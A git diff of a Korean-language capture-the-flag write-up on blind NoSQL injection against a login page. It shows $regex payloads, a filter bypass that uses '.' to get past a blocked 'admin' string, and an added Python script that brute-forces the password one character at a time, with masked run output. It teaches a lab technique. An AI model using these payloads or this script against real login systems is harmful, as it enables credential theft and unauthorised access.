@@ -60,17 +60,19 @@ app.listen(8000, '0.0.0.0');
 
 # 익스플로잇
 `/login?uid=guest&upw=guest`을 입력하면 이용자의 uid만 출력된다. flag 를 얻기 위해선 upw를 획득해야하기 때문에 다음과 같은 방법으로 익스플로잇한다
-1. Blind NoSQL Injection Payload 생성
-`$regex` 연산을 사용하여 정규표현식을 이용해 데이터를 검색한다.
+1. Blind NoSQL Injection Payload 생성 `$regex` 연산을 사용하여 정규표현식을 이용해 데이터를 검색한다.
+
 ```
 /login?uid=guest&upw[$regex]=.*
 
 guest
 ```
+
 만약 upw가 일치하는 경우 uid를, 아닌경우 undefined 문자열이 출력되는 것을 통해 참과 거짓을 확인 할 수 있다
 
 2. filter 우회
 filter 함수는 admin, dh, admi 문자열을 필터링하지만 정규표현식에서 임의 문자를 표현하는 `.`을 이용하여 쉽게 우회한다
+
 ```bash
 /login?uid[$regex]=ad.in&upw[$regex]=D.{*
 
@@ -79,9 +81,28 @@ admin
 
 3. Exploit Code 작성
 이제는 한글자씩 알아내야하므로, 여러번 쿼리를 전달해야하는데 이를 자동화하는 스크립트 코드를 작성하여 실행한다.
-스크립트 코드는 github에 따로 올립니다.
+
+```
+import requests, string
+
+HOST = 'http://localhost'
+ALPHANUMERIC = string.digits + string.ascii_letters
+SUCCESS = 'admin'
+
+flag = ''
+
+for i in range(32):
+    for ch in ALPHANUMERIC:
+        response = requests.get(f'{HOST}/login?uid[$regex]=ad.in&upw[$regex]=D.{{{flag}{ch}')
+        if response.text == SUCCESS:
+            flag += ch
+            break
+    
+    print(f'FLAG: DH{{{flag}}}')
+```
 
 # kali linux 에서 코드 작성 후 실행
+
 ```
 └─$ python3 nosql.py 
 FLAG: DH{8}
@@ -117,5 +138,6 @@ FLAG: DH{flag                          }
 FLAG: DH{flag                           }
 FLAG: DH{flag 가리기~~~!!!!!!!!!!!!!!!!!!}
 ```
+
 위와 같이 코드를 작성하여 실행 시키면 flag 값을 획득 할 수 있다.
 
